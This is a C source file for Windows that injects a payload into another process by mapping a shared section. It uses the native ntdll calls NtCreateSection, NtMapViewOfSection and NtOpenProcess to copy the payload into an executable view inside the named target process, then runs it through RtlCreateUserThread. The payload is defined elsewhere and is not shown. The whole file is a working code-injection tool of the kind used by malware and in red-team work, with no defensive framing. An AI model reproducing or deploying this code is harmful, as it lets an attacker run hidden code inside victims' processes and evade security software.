#include "Functions.h"
int main(int ArgC,char* ArgV[]){
    if(ArgC != 2){
        printf("Usage: main.exe ProcessName");
        return 0;
    }

    HEADER1("Creating a new Section ...");
    NtCreateSection CreateSec = (NtCreateSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtCreateSection");
    HANDLE newSec =NULL;
    SIZE_T size = 4096;
    LARGE_INTEGER secSize = {size};
    NTSTATUS result= CreateSec(&newSec,SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE,NULL,(PLARGE_INTEGER)&secSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
    if (result != 0){
        _ERROR("Cant Create New section 0x%x .... " ,result);
        return 0;
    }
    HEADER2("Section Created with handle 0x%x",newSec);


    HEADER1("Creating Local MapView ...");
    NtMapViewOfSection MapView = (NtMapViewOfSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtMapViewOfSection");
    PVOID localMapViewAddr=NULL;
    OBJECT_ATTRIBUTES OBJ = {(sizeof(OBJ)),NULL};
    result = MapView(newSec,GetCurrentProcess(),&localMapViewAddr,NULL,NULL,NULL,&size,ViewUnmap,NULL,PAGE_READWRITE);
    if(result != 0){
        _ERROR("Couldnt create local map view 0x%x....",result);
        return 0;
    }
    HEADER2("Allocated at 0x%x",localMapViewAddr);


    memcpy(localMapViewAddr,payload,payloadSize);
    HEADER2("Payload copied into the MapView");


    HEADER1("Target process ... ");
    NtOpenProcess Open = (NtOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtOpenProcess");
    int pid = GetProcID(ArgV[1]);
    HANDLE remoteProcess = NULL;
    CLIENT_ID ID={(PVOID*)pid,NULL};
    result= Open(&remoteProcess,PROCESS_ALL_ACCESS,&OBJ,&ID);
    if(result != 0){
        _ERROR("Couldnt open remote Process 0x%x....",result);
        return 0;
    }
    HEADER2("Opened with Handle 0x%x",remoteProcess);
    

    PVOID remoteMapViewAddr =NULL;
    result = MapView(newSec,remoteProcess,&remoteMapViewAddr,NULL,NULL,NULL,&size,ViewUnmap,NULL,PAGE_EXECUTE_READ);
    if(result != 0){
        _ERROR("Couldnt create remote map view 0x%x....",result);
        return 0;
    }
    HEADER2("Remote MapView allocated at 0x%x",remoteMapViewAddr);


    RtlCreateUserThread remoteThreadCreation = (RtlCreateUserThread)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"RtlCreateUserThread");
    HANDLE thread=NULL;
    result = remoteThreadCreation(remoteProcess,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)remoteMapViewAddr,0,&thread,&ID);
    HEADER2("Thread cereated at 0x%x",thread);
    if(result != 0){
        _ERROR("Couldnt execute remote map view 0x%x....",result);
        return 0;
    }  
    if(thread == NULL){
        _ERROR("Error While creating thread ..");     
        return 0;
    }

    HEADER2("Remote MapView is executed");
    return 0;
}
